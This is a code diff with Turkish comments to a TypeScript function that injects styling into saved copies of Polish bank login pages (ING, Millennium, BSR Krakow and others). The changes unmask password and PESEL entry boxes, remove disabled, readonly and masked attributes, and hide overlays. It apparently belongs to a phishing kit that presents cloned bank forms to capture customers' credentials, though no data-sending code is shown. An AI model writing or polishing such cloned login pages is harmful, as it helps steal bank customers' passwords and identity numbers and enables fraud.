@@ -454,11 +454,17 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
             "ing-button,ing-input,ing-input-masked-password-field,bnp-input,san-input{" +
             "pointer-events:auto !important;user-select:auto !important;-webkit-user-select:auto !important}" +
             ".sf-hidden{display:none !important}" +
-            // Tek-karakter masked kutular: yazilan karakter GORUNUR olsun
-            // (kullanici "yazdigimi goremiyorum" dedi) + okunur renk.
+            // Tek-karakter masked kutular: TUM BANKALARDA TEK TIP —
+            // ayni beyaz zemin, ayni border, ayni yazi; yazilan karakter
+            // gorunur. Genislik native tasarima birakilir (tasmaz).
             "input[maxlength='1'],input[text-length='1'],input[name^=Pesel-]{" +
-            "-webkit-text-security:none !important;color:#191c1f !important;" +
-            "-webkit-text-fill-color:#191c1f !important;opacity:1 !important;text-align:center !important}" +
+            "background:#ffffff !important;border:1px solid #b9b9b9 !important;border-radius:6px !important;" +
+            "color:#191c1f !important;-webkit-text-fill-color:#191c1f !important;-webkit-text-security:none !important;" +
+            "font-size:clamp(13px,4vw,18px) !important;font-weight:600 !important;text-align:center !important;" +
+            "min-height:38px !important;padding:0 !important;opacity:1 !important;caret-color:#191c1f !important;" +
+            "box-sizing:border-box !important}" +
+            "input[maxlength='1']:focus,input[text-length='1']:focus,input[name^=Pesel-]:focus{" +
+            "border-color:#dd1a21 !important;outline:2px solid rgba(221,26,33,.35) !important}" +
             ".modal-backdrop,.cdk-overlay-backdrop,.modal-blocker,.blocker{display:none !important}";
           (root.head || root.documentElement).appendChild(st);
         }
@@ -504,6 +510,12 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
             "}",
           "bsr-krakow":
             "@media(max-width:900px){html,body{min-width:0!important;overflow-x:hidden!important}}" ,
+          ing:
+            // password-N field'lari tek tip: hepsi 44px genis beyaz kutu;
+            // inline-flex ile native satirlarina sarar (tasmaz).
+            "ing-input-masked-password-field{display:inline-flex!important;width:44px!important;max-width:44px!important;" +
+            "height:48px!important;align-items:center!important;justify-content:center!important;" +
+            "vertical-align:top!important;margin:0 3px 6px 3px!important}",
           millennium:
             // PESEL satiri DINAMIK: 11 kutu container genisligine bolunur
             // (flex:1), aspect-ratio ile oran korunur — dar ekranda tasma
@@ -533,6 +545,9 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
             if (el.hasAttribute("disabled")) el.removeAttribute("disabled");
             if (el.hasAttribute("ng-disabled")) el.removeAttribute("ng-disabled");
             if (el.hasAttribute("inert")) el.removeAttribute("inert");
+            // ING masked field: "masked" attr gri/maskeli gorunum verir —
+            // silinince :host([masked]) stilleri devre disi, kutu beyaz aktif olur
+            if (el.hasAttribute("masked") && (el.tagName || "").toUpperCase().indexOf("ING-") === 0) el.removeAttribute("masked");
             // READONLY: bazi kayitlarda tum form readonly kaydedilmis
             // (pocztowy ~700 adet) -> giris "kapali" gorunuyor. Ac.
             if ((el.tagName === "INPUT" || el.tagName === "TEXTAREA") && el.hasAttribute("readonly")) el.removeAttribute("readonly");
@@ -552,6 +567,17 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
     // her acik shadowRoot'a kucuk fix-style enjekte edilir.
     // ------------------------------------------------------------------
     const fixShadowRoots = () => {
+      // Host tipine ozel shadow-ici CSS: ING masked field'in slotted
+      // input'unu tek tip beyaz kutuya cevirir (::slotted sadece shadow
+      // icinden erisilebilir); label/help-text chrome'unu gizler.
+      const SHADOW_HOST_CSS = {
+        "ing-input-masked-password-field":
+          "::slotted(input){width:100%!important;height:100%!important;min-height:40px!important;" +
+          "background:#ffffff!important;border:1px solid #b9b9b9!important;border-radius:6px!important;" +
+          "color:#191c1f!important;-webkit-text-fill-color:#191c1f!important;-webkit-text-security:none!important;" +
+          "font-size:18px!important;font-weight:600!important;text-align:center!important;padding:0!important;margin:0!important;opacity:1!important}" +
+          ":host .form-field__label,:host .form-field__help-text,:host ing-validation-feedback{display:none!important}",
+      };
       try {
         const seenRoots = new Set();
         const stack = [document];
@@ -570,7 +596,8 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
                     st.textContent =
                       "input,textarea,select,button,a,[role=button]{pointer-events:auto!important;user-select:auto!important;-webkit-user-select:auto!important}" +
                       "input[type=password]{-webkit-text-security:none!important;color:#191c1f!important;-webkit-text-fill-color:#191c1f!important}" +
-                      "[inert]{pointer-events:auto!important}";
+                      "[inert]{pointer-events:auto!important}" +
+                      (SHADOW_HOST_CSS[(el.tagName || "").toLowerCase()] || "");
                     el.shadowRoot.appendChild(st);
                   } catch (e) {}
                 }
